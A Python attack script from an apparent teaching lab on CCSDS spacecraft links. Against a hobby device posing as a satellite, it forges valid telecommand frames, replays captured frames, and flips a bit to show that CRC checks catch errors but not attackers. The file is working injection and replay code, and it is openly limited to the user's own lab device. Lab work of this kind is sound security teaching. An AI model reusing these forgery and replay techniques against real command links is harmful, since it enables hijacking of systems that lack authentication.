"""
Atacante - fase 1. Ahora el enlace habla CCSDS, pero sigue sin autenticacion.

Escenarios:
  inject          construye una trama TC valida (con su CRC) y pone la carga util en rojo.
                  El SCID no es un secreto: en la realidad se publica.
  replay <hex>    reenvia tal cual una trama capturada del enlace. Copia el hex de
                  una linea "[AIRE] TC enviado" de la consola de tierra.
  corrupt <hex>   reenvia una trama con un bit cambiado: el CRC la detecta. Sirve
                  para ver que el CRC protege de errores, pero NO de atacantes.

Efecto secundario de 'inject': el satelite toma al atacante por la estacion de
tierra y le manda a el la telemetria. La tierra deja de recibir HK hasta que
vuelve a enviar un comando.

Uso (en PowerShell):
    py attacks\\attack_f1.py --sat 192.168.33.105 inject
    py attacks\\attack_f1.py --sat 192.168.33.105 replay 00c5001103...
    py attacks\\attack_f1.py --sat 192.168.33.105 corrupt 00c5001103...

Solo contra tu propio C5, en tu propia red.
"""

import argparse
import os
import random
import socket
import sys

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "ground"))

from ccsds import frames, services  # noqa: E402
from ccsds.frames import CcsdsError  # noqa: E402

TC_PORT = 10025


def send_and_listen(sat: tuple, frame: bytes, wait: float = 2.0) -> None:
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
        s.settimeout(wait)
        s.sendto(frame, sat)
        print(f"[ATACANTE] Trama enviada ({len(frame)} bytes): {frame.hex()}")
        try:
            data, _ = s.recvfrom(2048)
        except (socket.timeout, ConnectionResetError):
            print("[ATACANTE] Sin respuesta del satelite.")
            return
    try:
        tm = frames.parse_tm_frame(data)
    except CcsdsError as e:
        print(f"[ATACANTE] Respuesta ilegible: {e}")
        return
    for pkt in tm.packets:
        print(f"[ATACANTE] Telemetria recibida: {services.decode_tm_packet(pkt)}")


def main(argv=None) -> int:
    p = argparse.ArgumentParser(description="Atacante (fase 1, solo para tu laboratorio)")
    p.add_argument("--sat", required=True, help="IP de TU C5")
    p.add_argument("--port", type=int, default=TC_PORT, help=argparse.SUPPRESS)
    sub = p.add_subparsers(dest="escenario", required=True)
    sub.add_parser("inject", help="inyectar un telecomando falso pero bien formado")
    rp = sub.add_parser("replay", help="reenviar una trama capturada")
    rp.add_argument("hex")
    cp = sub.add_parser("corrupt", help="reenviar una trama con un bit cambiado")
    cp.add_argument("hex")
    args = p.parse_args(argv)
    sat = (args.sat, args.port)

    if args.escenario == "inject":
        pkt = services.build_tc_packet(services.TC_SET_COLOR, random.randint(0, 0x3FFF), bytes([255, 0, 0]))
        frame = frames.build_tc_frame(pkt, seq=random.randint(0, 255))
        print("[ATACANTE] Construyo una trama TC CCSDS valida, con CRC correcto, sin conocer ningun secreto.")
        send_and_listen(sat, frame)
    else:
        try:
            frame = bytes.fromhex(args.hex)
        except ValueError:
            print("[ATACANTE] Ese hex no es valido. Copia la trama completa de la consola de tierra.")
            return 1
        if args.escenario == "corrupt":
            frame = bytearray(frame)
            frame[len(frame) // 2] ^= 0x01
            frame = bytes(frame)
            print("[ATACANTE] He cambiado un bit de la trama.")
        else:
            print("[ATACANTE] Reenvio una trama capturada, sin modificarla.")
        send_and_listen(sat, frame)
    return 0


if __name__ == "__main__":
    sys.exit(main())
